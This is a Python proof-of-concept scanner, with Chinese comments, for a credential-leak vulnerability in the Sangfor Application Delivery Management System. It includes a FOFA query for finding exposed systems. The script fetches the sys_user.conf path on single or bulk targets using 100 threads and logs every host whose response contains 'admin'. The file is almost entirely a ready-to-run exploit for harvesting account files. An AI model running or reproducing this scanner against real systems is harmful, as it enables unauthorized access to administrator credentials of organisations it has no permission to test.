#深信服应用交付管理系统sys_user.conf账号密码泄漏漏洞
#fofa:app="SANGFOR-应用交付管理系统"

import requests,sys,argparse,json,re
from multiprocessing.dummy import Pool
# 关闭警告
requests.packages.urllib3.disable_warnings()

def banner():
    test ="""
███████╗██╗   ██╗███████╗        ██╗   ██╗███████╗███████╗██████╗     ██████╗ ██████╗ ███╗   ██╗███████╗
██╔════╝╚██╗ ██╔╝██╔════╝        ██║   ██║██╔════╝██╔════╝██╔══██╗   ██╔════╝██╔═══██╗████╗  ██║██╔════╝
███████╗ ╚████╔╝ ███████╗        ██║   ██║███████╗█████╗  ██████╔╝   ██║     ██║   ██║██╔██╗ ██║█████╗  
╚════██║  ╚██╔╝  ╚════██║        ██║   ██║╚════██║██╔══╝  ██╔══██╗   ██║     ██║   ██║██║╚██╗██║██╔══╝  
███████║   ██║   ███████║███████╗╚██████╔╝███████║███████╗██║  ██║██╗╚██████╗╚██████╔╝██║ ╚████║██║     
╚══════╝   ╚═╝   ╚══════╝╚══════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝     
                                                                                                                                                                                                                                                                                           
"""
    print(test)
def main():
    banner()
    parse = argparse.ArgumentParser(description="深信服应用交付管理系统sys_user.conf账号密码泄漏漏洞")
    parse.add_argument('-u','--url',dest='url',type=str,help="please input you url")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input you file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)

    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    payload = "/tmp/updateme/sinfor/ad/sys/sys_user.conf"
    proxies ={
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    } 
    try:
        res1 = requests.get(url=target+payload,verify=False,proxies=proxies)
        if res1.status_code==200 and 'admin' in res1.text:
            print(f'[+]{target}存在漏洞')
            with open('result.txt','a',encoding='utf-8') as fp1:
                fp1.write(target+'\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except requests.RequestException as e:
        print(f"[-] 请求失败: {target}, 错误信息: {e}")
    except json.JSONDecodeError:
        print(f"[-] 无法解码JSON响应: {target}")
    except Exception as e:
        print(f"[-] 处理请求时出错: {target}, 错误信息: {e}")    

if __name__ == "__main__":
    main()